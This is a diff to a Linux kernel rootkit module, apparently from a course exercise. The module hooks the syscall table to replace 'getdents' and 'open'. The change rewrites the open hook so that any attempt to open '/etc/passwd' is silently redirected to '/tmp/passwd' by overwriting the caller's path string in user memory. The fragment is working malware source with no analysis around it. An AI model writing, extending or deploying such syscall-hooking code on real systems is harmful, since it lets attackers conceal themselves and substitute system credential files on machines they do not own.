@@ -47,7 +47,7 @@ static unsigned long * sys_call_table = (unsigned long *)0xffffffff81a00280;
 asmlinkage int (*original_sys_getdents)(unsigned int fd,
                                         struct linux_dirent * dirp,
                                         unsigned int count);
-asmlinkage int (*original_sys_open)(const char * pathname, int flags);
+asmlinkage int (*original_sys_open)(const char * pathname, int flags, mode_t mode);
 //asmlinkage ssize_t (*original_sys_read)(int fd, void * buf, size_t count);
 
 //Define our new sneaky version of the 'getdents' syscall
@@ -71,11 +71,13 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd,
 }
 
 //Define our new sneaky version of the 'open' syscall
-asmlinkage int sneaky_sys_open(const char *pathname, int flags)
+asmlinkage int sneaky_sys_open(const char *pathname, int flags, mode_t mode)
 {
-  //TODO
-  printk(KERN_INFO "Very, very Sneaky!\n");
-  return original_sys_open(pathname, flags);
+  if(strcmp(pathname, "/etc/passwd") == 0){
+    const char *cpyfile = "/tmp/passwd";
+    copy_to_user((char*)pathname, cpyfile, sizeof(cpyfile));
+  }
+  return original_sys_open(pathname, flags, mode);
 }
 /*
 //Define our new sneaky version of the 'read' syscall
